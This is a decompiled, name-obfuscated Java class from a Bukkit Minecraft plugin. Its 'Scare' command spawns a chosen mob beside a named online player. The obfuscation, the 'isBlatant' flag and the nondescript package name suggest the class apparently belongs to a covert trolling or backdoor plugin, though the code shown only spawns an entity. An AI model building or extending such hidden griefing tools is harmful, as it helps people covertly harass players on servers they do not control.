/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.Location
 *  org.bukkit.entity.EntityType
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class ScareCommand
extends Command {
    @Override
    public boolean isBlatant() {
        return false;
    }

    public ScareCommand() {
        ScareCommand lIIllIIlIlIl;
    }

    @Override
    public void execute(Core lIIllIIIIlll, String lIIllIIIIllI, String[] lIIllIIIIlIl, Player lIIllIIIIIIl) {
        if (lIIllIIIIlIl.length == 3) {
            Player lIIllIIIlIIl = Bukkit.getServer().getPlayer(lIIllIIIIlIl[1]);
            if (lIIllIIIlIIl == null) {
                lIIllIIIIIIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(lIIllIIIIlIl[1]).append(Settings.WHITE).append(" is not online."))));
            } else {
                Location lIIllIIIlIll = lIIllIIIlIIl.getLocation().getBlock().getRelative(0, 0, 3).getLocation();
                EntityType lIIllIIIlIlI = EntityType.valueOf((String)lIIllIIIIlIl[2].toUpperCase());
                try {
                    Bukkit.getScheduler().scheduleSyncDelayedTask((Plugin)lIIllIIIIlll, () -> lIIllIIIlIIl.getWorld().spawnEntity(lIIllIIIlIll, lIIllIIIlIlI));
                    lIIllIIIIIIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("Summoned ").append((Object)lIIllIIIlIlI).append(" on ").append(Settings.RED).append(lIIllIIIlIIl.getName()))));
                }
                catch (Exception lIIllIIIllII) {
                    lIIllIIIllII.printStackTrace();
                    lIIllIIIIIIl.sendMessage(Settings.PREFIX("That mob doesn't exist!"));
                }
            }
        } else {
            lIIllIIIIIIl.sendMessage(Settings.USAGE("Scare <player> <mob>"));
        }
    }
}

